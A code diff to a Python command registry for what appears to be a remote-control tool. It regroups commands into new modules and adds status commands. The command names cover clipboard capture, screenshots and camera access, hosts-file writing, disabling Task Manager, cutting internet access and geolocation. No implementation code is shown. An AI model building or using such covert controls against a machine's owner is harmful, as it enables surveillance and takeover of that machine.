@@ -1,6 +1,5 @@
 from abc import ABC, abstractmethod
 from enum import Enum
-from typing import Any
 from pydantic import BaseModel
 
 
@@ -33,11 +32,14 @@ class Command(Enum):
     PASTE_TO_CLIPBOARD = "PASTE_TO_CLIPBOARD"
     CLIPBOARD_FILLER = "CLIPBOARD_FILLER"
     FILLER_OFF = "FILLER_OFF"
+    GET_CLIPBOARD_FILLER_STATUS = "GET_CLIPBOARD_FILLER_STATUS"
+    
     GET_FOREGROUND_WINDOW_TITLE = "GET_FOREGROUND_WINDOW_TITLE"
     STOP_DISABLER = "STOP_DISABLER"
     DISABLE_CURRENT_WINDOWS_CONTINOUS = "DISABLE_CURRENT_WINDOWS_CONTINOUS"
     ENABLE_CURRENT_WINDOW = "ENABLE_CURRENT_WINDOW"
     DISABLE_CURRENT_WINDOW = "DISABLE_CURRENT_WINDOW"
+    DISABLE_WINDOW_STATUS = "DISABLE_WINDOW_STATUS"
 
     # Surveillance Commands
     SCREENSHOT = "SCREENSHOT"
@@ -140,18 +142,22 @@ command_to_module_map = {
     Command.BLOCK_MOUSE_SECONDS: "input_output",
     Command.BLOCK_ALL_SECONDS: "input_output",
     Command.BLOCK_SMART_SECONDS: "input_output",
-    Command.GET_CLIPBOARD: "input_output",
-    Command.PASTE_TO_CLIPBOARD: "input_output",
-    Command.CLIPBOARD_FILLER: "input_output",
-    Command.FILLER_OFF: "input_output",
-    Command.GET_FOREGROUND_WINDOW_TITLE: "input_output",
-    Command.STOP_DISABLER: "input_output",
-    Command.DISABLE_CURRENT_WINDOWS_CONTINOUS: "input_output",
-    Command.ENABLE_CURRENT_WINDOW: "input_output",
-    Command.DISABLE_CURRENT_WINDOW: "input_output",
+    
+    Command.GET_CLIPBOARD: "clipboard",
+    Command.PASTE_TO_CLIPBOARD: "clipboard",
+    Command.CLIPBOARD_FILLER: "clipboard",
+    Command.FILLER_OFF: "clipboard",
+    Command.GET_CLIPBOARD_FILLER_STATUS : "clipboard",
+    
+    Command.GET_FOREGROUND_WINDOW_TITLE: "window",
+    Command.STOP_DISABLER: "window",
+    Command.DISABLE_CURRENT_WINDOWS_CONTINOUS: "window",
+    Command.ENABLE_CURRENT_WINDOW: "window",
+    Command.DISABLE_CURRENT_WINDOW: "window",
+    Command.DISABLE_WINDOW_STATUS: "window",
 
     # Surveillance Commands
-    Command.SCREENSHOT: "surveillance",
+    Command.SCREENSHOT: "visuals",
     Command.GET_AVAILABLE_DEVICES: "surveillance",
     Command.START_CAMERA: "surveillance",
 
@@ -175,8 +181,8 @@ command_to_module_map = {
     Command.GET_HOSTFILE_CONTENTS: "hostfile",
     Command.WRITE_HOSTFILE_CONTENTS: "hostfile",
     
-    Command.GET_INSTALLED_PROGRAMS: "system",
-    Command.RUN_UNINSTALLER: "system",
+    Command.GET_INSTALLED_PROGRAMS: "programs",
+    Command.RUN_UNINSTALLER: "programs",
     
     Command.ENABLE_INTERNET: "internet",
     Command.DISABLE_INTERNET: "internet",
@@ -202,10 +208,10 @@ command_to_module_map = {
     Command.KILL_PROCESS: "process",
     Command.GET_PROCESSES: "process",
     
-    Command.GEO_LOCATE: "system",
-    Command.GET_USERNAME: "system",
-    Command.GET_UPTIME: "system",
-    Command.GET_SYSTEM_INFO: "system",
+    Command.GEO_LOCATE: "sys_info",
+    Command.GET_USERNAME: "sys_info",
+    Command.GET_UPTIME: "sys_info",
+    Command.GET_SYSTEM_INFO: "sys_info",
     
     Command.ENABLE_TASKMANAGER: "taskmanager",
     Command.DISABLE_TASKMANAGER: "taskmanager",
